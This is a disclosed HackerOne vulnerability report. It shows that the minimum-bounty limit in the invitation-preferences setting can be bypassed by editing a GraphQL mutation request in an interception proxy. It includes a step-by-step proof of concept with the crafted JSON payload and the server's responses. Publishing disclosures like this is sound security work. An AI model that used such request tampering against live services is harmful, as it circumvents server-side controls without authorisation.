# Hacker can bypass minimum bounty amount restrictions in "invitation preferences" setting via UpdateInvitationPreferencesMutation GraphQL operation

## Report Details
- **Report ID**: 981036
- **URL**: https://hackerone.com/reports/981036
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-09-13T07:22:47.775Z
- **Disclosed**: 2021-09-20T13:20:06.264Z

## Reporter
- **Username**: frozensolid
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
Hacker can bypass minimum bounty amount restrictions in invitation preferences due to trusted client-side input to `UpdateInvitationPreferencesMutation` GraphQL operation

**Description:**
The new "Bounty Preferences" feature at https://hackerone.com/settings/preferences allows the hacker to set a minimum critical bounty size for their future private program invitations. 
The largest minimum bounty a hacker can select using the slider in the user interface is based on their average bounty payout. 
I've submitted a few low severity/low payout issues lately so my average is dropping like a stone. I was excited to see if there was a way around this. 

A hacker can bypass this minimum bounty slider by sending a crafted POST to the `UpdateInvitationPreferencesMutation` GraphQL operation at https://hackerone.com/graphql

```
{"operationName":"UpdateInvitationPreferencesMutation",
  "variables":
    {"min_bounty":1337},
"query":"mutation UpdateInvitationPreferencesMutation($receive_invites: Boolean, $bounty_programs_only: Boolean, $exclude_crypto_programs: Boolean, $min_bounty: Float, $time_off_ends_at: DateTime) {\n  updateInvitationPreferences(input: {receive_invites: $receive_invites, bounty_programs_only: $bounty_programs_only, exclude_crypto_programs: $exclude_crypto_programs, min_bounty: $min_bounty, time_off_ends_at: $time_off_ends_at}) {\n    me {\n      id\n      hacker_invitations_profile {\n        id\n        receive_invites\n        bounty_programs_only\n        min_bounty\n        exclude_crypto_programs\n        active_time_off\n        time_off_ends_at\n        __typename\n      }\n      __typename\n    }\n    was_successful\n    __typename\n  }\n}\n"}
```

### Steps To Reproduce

1. Start your favorite interception proxy (I used Portswigger BurpSuite)
2. Login to a hackerone account (hacker persona)
3. visit https://hackerone.com/settings/preferences
4. Toggle on "Only invite me for programs that award a Bounty"
5. set slider to an initial value (for later comparison)
6. Enable request interception in the proxy
7. set slider to a different value 
8. the intercepted request will look like this: 
    ```
    POST /graphql HTTP/1.1
    Host: hackerone.com
    Connection: close
    Content-Length: 848
    accept: */*
    X-Auth-Token: ████████████████████████████████████
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
    content-type: application/json
    Origin: https://hackerone.com
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://hackerone.com/settings/preferences
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: ███████████████████████████████████
    
    {"operationName":"UpdateInvitationPreferencesMutation",
      "variables":{
        "min_bounty":1337
      },
      "query":"mutation UpdateInvitationPreferencesMutation($receive_invites: Boolean, $bounty_programs_only: Boolean, $exclude_crypto_programs: Boolean, $min_bounty: Float, $time_off_ends_at: DateTime) {\n  updateInvitationPreferences(input: {receive_invites: $receive_invites, bounty_programs_only: $bounty_programs_only, exclude_crypto_programs: $exclude_crypto_programs, min_bounty: $min_bounty, time_off_ends_at: $time_off_ends_at}) {\n    me {\n      id\n      hacker_invitations_profile {\n        id\n        receive_invites\n        bounty_programs_only\n        min_bounty\n        exclude_crypto_programs\n        active_time_off\n        time_off_ends_at\n        __typename\n      }\n      __typename\n    }\n    was_successful\n    __typename\n  }\n}\n"
    }
    ```
9. Update the `min_bounty` variable to the desired minimum bounty. on my account I set to `7000`
    ```
    {"operationName":"UpdateInvitationPreferencesMutation",
      "variables":{
        "min_bounty":7000
      },
      "query":"mutation UpdateInvitationPreferencesMutation($receive_invites: Boolean, $bounty_programs_only: Boolean, $exclude_crypto_programs: Boolean, $min_bounty: Float, $time_off_ends_at: DateTime) {\n  updateInvitationPreferences(input: {receive_invites: $receive_invites, bounty_programs_only: $bounty_programs_only, exclude_crypto_programs: $exclude_crypto_programs, min_bounty: $min_bounty, time_off_ends_at: $time_off_ends_at}) {\n    me {\n      id\n      hacker_invitations_profile {\n        id\n        receive_invites\n        bounty_programs_only\n        min_bounty\n        exclude_crypto_programs\n        active_time_off\n        time_off_ends_at\n        __typename\n      }\n      __typename\n    }\n    was_successful\n    __typename\n  }\n}\n"
    }
    ```

10. Now submit your crafted POST request. my request received a 200 OK with `"was_successful":true` with the following result:
    ```
    {
       "data":{
          "updateInvitationPreferences":{
             "me":{
                "id":"██████",
                "hacker_invitations_profile":{
                   "id":"██████",
                   "receive_invites":true,
                   "bounty_programs_only":true,
                   "min_bounty":7000.0,
                   "exclude_crypto_programs":true,
                   "active_time_off":false,
                   "time_off_ends_at":null,
                   "__typename":"HackerInvitationsProfile"
                },
                "__typename":"User"
             },
             "was_successful":true,
             "__typename":"UpdateInvitationPreferencesPayload"
          }
       }
    }
    ```
    ████
11. to further verify, I queried GraphQL again with the `UserInvitationSettingsQuery` operation and received back 
    ```
    {
       "data":{
          "me":{
             "id":███████████████████████████████████,
             "hacker_invitations_profile":{
                "id":███████████████████████████████████,
                "receive_invites":true,
                "bounty_programs_only":true,
                "min_bounty":7000.0,
                "exclude_crypto_programs":true,
                "time_off_ends_at":null,
                "active_time_off":false,
                "__typename":"HackerInvitationsProfile"
             },
             "bounties":{
                "average_amount":600.625,
                "__typename":"BountyConnection"
             },
             "__typename":"User"
          }
       }
    }
    ```
    ██████

12. await your next private program invitation with a higher critical bounty payout.


### Optional: Your Environment (Browser version, Device, etc)

 * Chrome/ Chromium 85.0.4183.83 (Official Build) (64-bit) (Mac OS 10.15.6)

### Optional: Supporting Material/References (Screenshots)
Updating the minimum critical bounty payout.
███████

Querying the current set minimum bounty 
███

### Optional: Did you use [recon data made available by HackerOne](https://github.com/Hacker0x01/helpful-recon-data) to find this vulnerability?
no

## Impact

Hacker can further influence which private programs they are invited to outside of the intended design of the minimum critical bounty feature.

## Attachments
No attachments
